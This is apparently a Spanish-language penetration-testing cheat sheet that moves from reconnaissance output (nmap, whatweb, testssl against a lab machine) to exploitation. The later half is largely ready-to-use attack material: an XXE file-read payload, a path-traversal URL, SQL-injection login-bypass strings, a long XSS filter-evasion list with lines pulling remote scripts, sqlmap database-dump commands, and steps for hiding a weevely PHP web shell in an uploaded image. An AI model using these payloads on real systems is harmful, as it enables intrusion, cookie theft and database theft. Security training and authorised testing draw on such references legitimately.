# Cheetsheet Pentest

## Reconocimiento

### Información básica

Con herramientas como whatweb podemos hacer un reconocimiento inicial del sitio web para obtener información como la IP, el SO del servidor, en que país está este alojado o alguna vulnerabilidad básica, como XSS.

``` bash
└─$ whatweb <URL>
http://35.227.24.107/d6a05ac5cf/ [200 OK] Country[UNITED STATES][US], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[35.227.24.107], Script, Title[Micro-CMS], maybe Vulnerable-To-XSS[["", "alert(1)"] ], nginx[1.14.0]
```



### Listado de directorios

Para la enumeración de directorios podemos utilizar gobuster dir.

```bash
└─$ gobuster dir -u <URL> -w <WORDLIST>
```



### Archivos interesantes

Podemos modificar la URL para encontrar archivos en el servidor como *robots.txt* o *crossdomain.xml*.





## Network

### Nmap

Con Nmap podemos obtener un escaneo de todos los puertos abiertos que tiene la máquina objetivo con su correspondiente servicio, además de saber la versión del SO, etc.

``` bash
└─$ nmap 10.0.0.4 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-26 09:20 CET
Nmap scan report for 10.0.0.4
Host is up (0.000066s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:62:73:16 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Además de esto Nmap permite utilizar scripts que comprueban si existen usuarios sin contraseña, BBDD y sus usuarios, vulnerabilidades más conocidas, etc.

#### Auth

Revisa si hay usuarios sin contraseña, BBDD y sus usuarios, usuarios del sistema, etc.

```bash
└─$ nmap -f -sS -sV --script auth <IP>
```

```bash
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-publickey-acceptance: 
|_  Accepted Public Keys: No public keys accepted
```

```bash
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-empty-password: 
|_  root account has empty password
| mysql-users: 
|   debian-sys-maint
|   guest
|_  root
```

```bash
 Host script results:| smb-enum-users: |_  Domain: METASPLOITABLE; Users: backup, bin, bind, daemon, dhcp, distccd, ftp, games, gnats, irc, klog, libuuid, list, lp, mail, man, msfadmin, mysql, news, nobody, postfix, postgres, proftpd, proxy, root, service, sshd, sync, sys, syslog, telnetd, tomcat55, user, uucp, www-data
```



#### Vuln

Hace un escáner de las vulnerabilidades más conocidas.

```bash
└─$ sudo nmap -f -sS -sV --script vuln <IP>
```

```bash
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
```

```bash
694E48CD5EE27CE55D6801DE        *EXPLOIT*
|       EDB-ID:35738    4.3     https://vulners.com/exploitdb/EDB-ID:35738      *EXPLOIT*
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558
|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499
|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053
|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317
|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639
|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348
|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419
|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434
|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939
|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687
|       SSV:60250       1.2     https://vulners.com/seebug/SSV:60250    *EXPLOIT*
|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415
```



#### Malware

Muestra si hay conexiones abiertas por backdoors.

```bash
└─$ sudo nmap -f -sS -sV --script malware <IP>
```

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       https://www.securityfocus.com/bid/48539
|_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
```



### TestSSL

Con TestSSL podemos comprobar si los puertos de un servidor están protegidos con algún certificado como SSL o TLS. 

```bash
└─$ sudo docker run --rm -t mytestssl <domain>

###########################################################
    testssl.sh       3.1dev from https://testssl.sh/dev/

      This program is free software. Distribution and
             modification under GPLv2 permitted.
      USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK!

       Please file bugs @ https://testssl.sh/bugs/

###########################################################

 Using "OpenSSL 1.0.2-chacha (1.0.2k-dev)" [~183 ciphers]
 on 91a0c9091746:/home/testssl/bin/openssl.Linux.x86_64
 (built: "Jan 18 17:12:17 2019", platform: "linux-x86_64")


 Start 2022-01-26 08:51:16        -->> 140.82.121.3:443 (<domain>) <<--

 rDNS (140.82.121.3):    lb-140-82-121-3-fra.<domain>.
 Service detected:       Couldn't determine what's running on port 443, assuming no HTTP service => skipping all HTTP checks


 Testing protocols via sockets except NPN+ALPN 

 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1      not offered
 TLS 1.1    not offered
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK): final
 NPN/SPDY   not offered
 ALPN/HTTP2 h2, http/1.1 (offered)

 Testing cipher categories 

 NULL ciphers (no encryption)                      not offered (OK)
 Anonymous NULL Ciphers (no authentication)        not offered (OK)
 Export ciphers (w/o ADH+NULL)                     not offered (OK)
 LOW: 64 Bit + DES, RC[2,4], MD5 (w/o export)      not offered (OK)
 Triple DES Ciphers / IDEA                         not offered
 Obsoleted CBC ciphers (AES, ARIA etc.)            offered
 Strong encryption (AEAD ciphers) with no FS       offered (OK)
 Forward Secrecy strong encryption (AEAD ciphers)  offered (OK)
```





## Reconocimiento avanzado

### Detectar XSS

Para encontrar vulnerabilidades XSS podemos utilizar una herramienta llamada Dalfox. Esta nos devolverá los payloads inyectables a una web que es vulnerable a XSS.

```bash
└─$ sudo docker run -it hahwul/dalfox:latest /app/dalfox url <http://example.com/inicio.php?"parametro">
```

Ejemplo:

``` bash
[V] Triggered XSS Payload (found DOM Object): id="><svg/OnLoad="`${prompt``}`" class=dalfox>
    1 line:  "><svg/OnLoad="`${prompt``}`" class=dalfox><body>
```



### Detectar y explotar XXE

Si analizamos las peticiones que se envian al servidor y vemos que los datos pasan por XML podríamos explotar esta vulnerabilidad para acceder a archivos del servidor:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Si modificamos la petición que contiene el XML con este código podríamos, por ejemplo, acceder al fichero /etc/passwd.



### Detectar SQLI

Para saber si una web que utiliza una BBDD para un login, por ejemplo, es vulnerable a SQLInjection debemos introducir carácteres como las `` "``. Si nos aparece un error interno del servidor (y no un error de usuario y contraseña inválidos) o directamente no nos aparece ningún error es probable que sea vulnerable.

En el apartado de explotación explico como utilizar SQLMap para explotar y extraer información de una base de datos.

#### Hacer login con ByPass:

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
```



### Detectar File Upload

Para detectar una vulnerabilidad de File Upload primero debemos asegurarnos de si se pueden subir ficheros al servidor. En caso afirmativo miraremos si podemos subir ficheros con extensión *.sh*, *.py* o *.php*, entre otras. Si la subida de ficheros con esta extensión está bloqueada podríamos subir el script con una extensión permitida y luego interceptar la petición con BurpSuite y modificar la extensión a *.sh*, *.py* o *.php*, según nuestros intereses.

Ejemplo:

![image-20220126101046875](https://github.com/MrFrozenPepe/Pentest-Cheetsheet/blob/main/images/burp.png)



### Detectar y explotar File Inclusion

En caso que exista alguna variable por el método GET podríamos modificar la URL para acceder a los ficheros del servidor. Para detectarla simplemente deberíamos asegurarnos que que existe alguna variable por el método GET y modificar la URL haciéndole una petición a algún directorio del servidor.

Ejemplo:

```url
<domain>/ejemplo.php?<variable>=../../../etc/passwd
```





## Explotación de las vulnerabilidades

### Explotar XSS

Principalmente existen dos tipos de XSS:

#### Reflejado

Existe una variable por el método GET, y a través de la URL podemos añadir un código en javaScript que al ejecutarse cumpla nuestro propósito.

Ejemplo:

```java
<domain>/ejemplo.php?<variable>=<script>alert(1)</script>
```



#### Almacenado

Si en la web existe un caja de comentarios o alguna entrada de texto que se quede almacenada en el servidor podríamos introducir el código y de esta forma hacer que se ejecute el script cada vez que algún usuario entre dentro de esta caja de comentarios.

Ejemplo:

```java
<script>alert(1)</script>
```

El almacenado es muy útil para extraer cookies de los usuarios. Simplemente habría que introducir una carga útil dentro de las etiquetas de script que se encargue de robarles las cookies.



#### ByPass en caso que exista algún filtro:

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
<script/src=data:,alert()>
<marquee/onstart=alert()>
<video/poster/onerror=alert()>
<isindex/autofocus/onfocus=alert()>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</script><script>alert('XSS');</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>

```



### Explotar SQLI

Para explotar SQLI una buena herramienta es SQLMap. Con ella podemos obtener información sobre la base de datos, sobre sus tablas y la información contenida en ellas.

```bash
## CON MÉTODO GET:
## Base de Datos
└─$ sqlmap -u "http://10.0.0.6/sqli/lab1.php?usuario=cpera&password=fsdjwf" --current-db

## Tablas
└─$ sqlmap -u "http://10.0.0.6/sqli/lab1.php?usuario=cpera&password=fsdjwf" --tables -D <BBDD>  

## Columnas
└─$ sqlmap -u "<URL>?usuario=<usuario>&password=<inventada>" --columns -D <BBDD> -T <tabla>

## Información de las tablas
└─$ sqlmap -u "http://10.0.0.6/sqli/lab1.php?usuario=cpera&password=fsdjwf" -D <BBDD> -T <tabla> --dump

## CON MÉTODO POST
└─$ sqlmap -u "http://10.0.0.6/sqli/lab1.php" --method POST --data "usuario=cpera&password=asd" + anteriores parámetros
```



### Explotar File Inclusion

Para subir por ejemplo un reverse shell al servidor una de las formas que mejor funcionan a un alto nivel de seguridad es subir una imagen con el payload añadido en el comentario de la misma. Para obtener el reverse shell utilizamos weevely:

```bash
weevely generate reverse.php <password>
```

Una vez hecho esto añadiremos el payload a la imagen. Esto lo hacemos con jhead:

```bash
jhead -ce <archivo>
```

```bash
<payload> + __halt_compiler();
```

Ahora lo subimos al servidor y con BurpSuite interceptamos la petición y le cambiamos la extensión a *.php*.

Por útlimo ejecutamos el reverse shell indicando la URL de donde se ha subido el archivo en el servidor en nuestra máquina atacante:

```bash
weevely <URL> <password>
```

